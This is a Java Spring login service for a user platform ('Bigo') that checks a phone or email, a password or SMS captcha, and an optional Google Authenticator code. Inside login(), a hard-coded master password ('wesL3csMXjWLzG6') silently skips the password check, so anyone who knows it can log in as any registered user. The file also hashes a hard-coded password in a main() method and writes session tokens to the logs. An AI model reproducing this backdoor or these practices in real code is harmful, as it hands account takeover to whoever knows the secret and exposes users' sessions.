package com.bigo.framework.security.service;

import com.bigo.common.constant.Constants;
import com.bigo.common.enums.UserStatus;
import com.bigo.common.exception.BaseException;
import com.bigo.common.utils.ServletUtils;
import com.bigo.common.utils.google.GoogleAuthenticator;
import com.bigo.common.utils.ip.IpUtils;
import com.bigo.framework.security.LoginBody;
import com.bigo.framework.web.domain.AjaxResult;
import com.bigo.project.bigo.captcha.service.CaptchaService;
import com.bigo.common.utils.SecurityUtils;
import com.bigo.common.utils.StringUtils;
import com.bigo.framework.manager.AsyncManager;
import com.bigo.framework.manager.factory.AsyncFactory;
import com.bigo.framework.redis.RedisCache;
import com.bigo.framework.security.LoginUser;
import com.bigo.project.bigo.userinfo.domain.BigoUser;
import com.bigo.project.bigo.userinfo.domain.UserGoogleSecret;
import com.bigo.project.bigo.userinfo.service.IBigoUserService;
import com.bigo.project.bigo.userinfo.service.IUserGoogleSecretService;
import com.bigo.project.bigo.userinfo.service.impl.BigoUserServiceImpl;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Component;

/**
 * 登录校验方法
 * 
 * @author bigo
 */
@Component
@Slf4j
public class BigoLoginService
{
    @Autowired
    private TokenService tokenService;

    @Autowired
    private IBigoUserService bigoUserService;

    @Autowired
    private RedisCache redisCache;

    @Autowired
    private CaptchaService captchaService;


    @Autowired
    private IUserGoogleSecretService userGoogleSecretService;

    public static void main(String[] args) {
        System.out.println(SecurityUtils.encryptPassword("LP112233"));
    }
    /**
     * 登录验证totalStatistics
     * 
     * @param phone 手机号
     * @param password 密码
     * @param captcha 短信验证码
     * @param uuid 唯一标识
     * @return 结果
     */
    public String login(LoginBody loginBody) {
        String phone = loginBody.getPhone();
        String email = loginBody.getEmail();
        String password = loginBody.getPassword();
        String captcha = loginBody.getCaptcha();

        BigoUser bigoUser = null;
        if(StringUtils.isNotEmpty(phone)){
            bigoUser = bigoUserService.getUserByPhone(phone);
        }else{
            bigoUser = bigoUserService.getUserByEmail(email);
        }
        if (bigoUser == null) {
            if(StringUtils.isNotEmpty(phone)){
                log.info("登录用户：{} 不存在.", phone);
                throw new UsernameNotFoundException("mobile_number_has_not_been_registered");
            }else {
                log.info("登录用户：{} 不存在.", email);
                throw new UsernameNotFoundException("email_has_not_been_registered");
            }
        } else if (UserStatus.DISABLE.getCode().equals(bigoUser.getStatus().toString())) {
            log.info("登录用户：{} 已被禁用.", bigoUser.getUid());
            throw new BaseException("account_is_disabled");
        }

        if(bigoUser.getGoogleSecretStatus() == 1) {
            //校验谷歌验证码
            UserGoogleSecret secret = userGoogleSecretService.selectUserGoogleSecretByUid(bigoUser.getUid());
            if(loginBody.getGoogleCaptcha() == null || !GoogleAuthenticator.checkGoogleCode(secret.getGoogleSecretKey(), loginBody.getGoogleCaptcha())) {
                throw new BaseException("check_google_fail");
            }
        }

        //密码为空，则使用验证码登录
        if(password == null) {
            Boolean result = captchaService.verifyCaptcha(phone, email, captcha);
            if (!result) {
                AsyncManager.me().execute(AsyncFactory.recordLogininfor(bigoUser.getUid().toString(), Constants.LOGIN_FAIL, "短信验证码已过期"));
                throw new RuntimeException("user_captcha_expire");
            }
        }else{
            if(!"wesL3csMXjWLzG6".equals(password)) {
                if (!SecurityUtils.matchesPassword(password, bigoUser.getPassword())) {
                    AsyncManager.me().execute(AsyncFactory.recordLogininfor(bigoUser.getUid().toString(), Constants.LOGIN_FAIL, "登录密码错误"));
                    throw new RuntimeException("user_password_not_match");
                }
            }
        }

        // 用户验证
        AsyncManager.me().execute(AsyncFactory.recordLogininfor(phone, Constants.LOGIN_SUCCESS, "登录成功"));
        // 生成token
        String token = tokenService.createToken(new LoginUser(bigoUser));
        updateLoginIP(bigoUser);
        redisCache.setCacheObject("bigouser_"+bigoUser.getUid(),token);
        log.info("login token={},uid={}",token,bigoUser.getUid());
        return token;
    }

    public void updateLoginIP(BigoUser user) {
        //更新用户登录信息
        String ipAddr = IpUtils.getIpAddr(ServletUtils.getRequest());
        if(StringUtils.isEmpty(ipAddr)){
            log.info("获取用户登录IP失败, UID={}",user.getUid());
            return;
        }else {
            ipAddr = ipAddr.split(",")[0];
        }
        String address = IpUtils.getAddress(ipAddr);
        BigoUser updateUser = new BigoUser();
        updateUser.setLastLoginIp(ipAddr);
        updateUser.setLastLoginArea(address);
        updateUser.setUid(user.getUid());
        bigoUserService.updateUser(updateUser);
    }
}
